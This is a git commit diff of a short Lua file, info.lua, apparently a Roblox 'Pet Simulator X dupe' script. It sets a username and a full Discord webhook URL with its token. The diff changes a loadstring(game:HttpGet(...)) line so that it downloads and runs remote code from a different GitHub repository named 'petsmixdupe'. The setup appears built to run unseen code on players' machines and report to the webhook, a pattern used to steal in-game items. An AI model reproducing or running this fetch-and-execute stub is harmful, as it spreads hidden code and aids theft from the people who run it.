3a686b968199125e7c49a9b2aebd6a5c1726e773
k4ftt <103969132+k4ftt@users.noreply.github.com>
2022-12-10 22:04:23 +0100

    Update info.lua

--- info.lua
+++ info.lua
@@ -1,4 +1,4 @@
 UserName = "Mradnane"
 WebHook = "https://discord.com/api/webhooks/1050857617959956520/R74db3_ylPQUZQTBpngbRxiS8Q9aoxqcxSqHR9Ybb14UT91u5BT8ewR0oBsIJG1PrBwv"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/PSX/main/info1.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/info1.lua", true))()
